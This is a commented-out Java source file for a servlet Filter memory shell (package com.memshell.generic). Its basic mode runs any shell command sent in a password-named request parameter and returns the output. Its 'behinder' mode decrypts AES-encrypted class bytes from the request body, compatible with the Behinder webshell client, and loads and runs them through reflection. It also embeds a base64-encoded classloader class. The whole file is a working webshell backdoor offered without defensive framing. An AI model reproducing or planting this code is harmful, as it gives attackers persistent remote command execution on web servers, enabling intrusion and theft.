//package com.memshell.generic;
//
//import sun.misc.BASE64Decoder;
//import javax.crypto.Cipher;
//import javax.crypto.spec.SecretKeySpec;
//import javax.servlet.*;
//import javax.servlet.http.HttpServletRequest;
//import java.io.IOException;
//import java.lang.reflect.InvocationTargetException;
//import java.lang.reflect.Method;
//import java.util.Scanner;
//import java.util.UUID;
//
//public class DynamicFilterTemplate implements Filter {
//
//    private String password;
//    private Class myClassLoaderClazz;
//
//    public DynamicFilterTemplate(){
//        super();
//        this.password = "pass";
//        initialize();
//    }
//
//    public DynamicFilterTemplate(String password){
//        super();
//        this.password = password;
//        initialize();
//    }
//
//    @Override
//    public void init(FilterConfig filterConfig) throws ServletException {
//
//    }
//
//    @Override
//    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
//        System.out.println("[+] Dynamic Filter says hello");
//
//        String type = servletRequest.getParameter("type");
//        if(type != null && type.equals("basic")){
//            String cmd = servletRequest.getParameter(password);
//            if(cmd != null && !cmd.isEmpty()){
//                String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
//                servletResponse.getWriter().println(result);
//            }
//        }else if(type != null && type.equals("behinder")){
//            try{
//                if(servletRequest.getParameter(password) != null){
//                    String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
//                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", key);
//                    servletResponse.getWriter().print(key);
//                    return;
//                }
//
//                Cipher cipher = Cipher.getInstance("AES");
//                cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
//                byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
//                Class evilClass = (Class) myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke(null, evilClassBytes, Thread.currentThread().getContextClassLoader());
//                Object evilObject = evilClass.newInstance();
//                Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
//                targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
//            }catch(Exception e){
//                e.printStackTrace();
//            }
//        }else{
//            filterChain.doFilter(servletRequest, servletResponse);
//        }
//    }
//
//    @Override
//    public void destroy() {
//
//    }
//
//    private void initialize(){
//        try{
//            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//            try{
//                this.myClassLoaderClazz = classLoader.loadClass("com.memshell.generic.MyClassLoader");
//            } catch (ClassNotFoundException e) {
//                Class clazz = classLoader.getClass();
//                Method method = null;
//                while(method == null && clazz != Object.class){
//                    try{
//                        method = clazz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                    }catch(NoSuchMethodException ex){
//                        clazz = clazz.getSuperclass();
//                    }
//                }
//
//                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACRMY29tL21lbXNoZWxsL2dlbmVyaWMvTXlDbGFzc0xvYWRlcjsBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAtkZWZpbmVDbGFzcwEALChbQkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAKU291cmNlRmlsZQEAEk15Q2xhc3NMb2FkZXIuamF2YQwABgAHAQAiY29tL21lbXNoZWxsL2dlbmVyaWMvTXlDbGFzc0xvYWRlcgwADwAaAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQACAAUAAAAAAAIAAAAGAAcAAQAIAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAJAAAABgABAAAABAAKAAAAFgACAAAABgALAAwAAAAAAAYADQAOAAEACQAPABAAAQAIAAAARAAEAAIAAAAQuwACWSu3AAMqAyq+tgAEsAAAAAIACQAAAAYAAQAAAAgACgAAABYAAgAAABAAEQASAAAAAAAQABMADgABAAEAFAAAAAIAFQ==";
//                byte[] bytes = new BASE64Decoder().decodeBuffer(code);
//                method.setAccessible(true);
//                this.myClassLoaderClazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
//            }
//        } catch (IllegalAccessException e) {
//            e.printStackTrace();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InvocationTargetException e) {
//            e.printStackTrace();
//        }
//    }
//}
